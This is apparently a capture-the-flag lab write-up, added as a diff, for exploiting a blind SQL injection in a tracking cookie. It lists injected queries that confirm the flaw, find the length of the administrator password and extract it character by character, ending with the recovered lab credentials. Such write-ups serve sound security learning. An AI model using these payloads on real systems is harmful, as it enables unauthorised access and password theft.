@@ -1,0 +1,80 @@
+Vulnerable parameter - Tracking cookie
+
+Goals:
+1- Enumerate the password of the administrator.
+2- Log in as the administrator user.
+
+Analysis:
+--------
+
+Step #1: Confirm that the parameter is vulnerable to blind SQL injection
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy'
+
+-> if the tracking id exists -> query returns value -> Welcome back message
+
+-> if the tracking id doesn't exist -> query returns nothing -> no Welcome back message
+
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy' AND 1=1--'
+-> True -> Welcome back
+
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy' AND 1=2--'
+-> False -> no Welcome back
+
+Step #2: Confirm that the users table exist
+
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy' AND (SELECT 'x' FROM users LIMIT 1) = 'x'--'
+-> True -> Welcome back 
+The users table exist in the database
+
+Step #3: Confirm that username administrator exists in users table
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy' AND (SELECT username FROM users WHERE username = 'administrator') = 'administrator'--'
+-> True -> Welcome back
+The administrator user exists
+
+Step #4: Enumerate the password of the administrator user
+
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy' AND (SELECT password FROM users WHERE username = 'administrator') = 'administrator'--'
+-> wrong way 
+
+first determine the length of the password
+
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy' AND (SELECT username FROM users WHERE username = 'administrator' and LENGTH(password) > 1) = 'administrator'--'
+-> True -> Welcome back
+
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy' AND (SELECT username FROM users WHERE username = 'administrator' and LENGTH(password) > 2) = 'administrator'--'
+-> True -> Welcome back
+
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy' AND (SELECT username FROM users WHERE username = 'administrator' and LENGTH(password) > 10) = 'administrator'--'
+-> True -> Welcome back
+
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy' AND (SELECT username FROM users WHERE username = 'administrator' and LENGTH(password) > 15) = 'administrator'--'
+-> True -> Welcome back
+
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy' AND (SELECT username FROM users WHERE username = 'administrator' and LENGTH(password) > 20) = 'administrator'--'
+-> False -> no Welcome back
+
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy' AND (SELECT username FROM users WHERE username = 'administrator' and LENGTH(password) = 20) = 'administrator'--'
+-> True -> Welcome back
+
+The length of the password is 20
+
+note: You could use the Intruder in Burp Suite to do this
+
+after finding the length of the password
+
+start finding the first character then the second character then the next character until the character number 20 
+
+note: You could use the Intruder in Burp Suite to do this
+
+SELECT Tracking_Id FROM Tracking_table WHERE TrackingId = 'iavRdFDiiZD877vy' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username = 'administrator') = 'a'--'
+-> if Welcome back exist -> first character equal to 'a'
+-> if Welcome back doesn't exist -> first character doesn't equal to 'a'
+
+do this until you find all the characters in the password
+
+Step #5: Login as the administrator user
+
+Username: administrator
+Password: 5du4t6hcm5z7mn5nzacb
+
+Solved
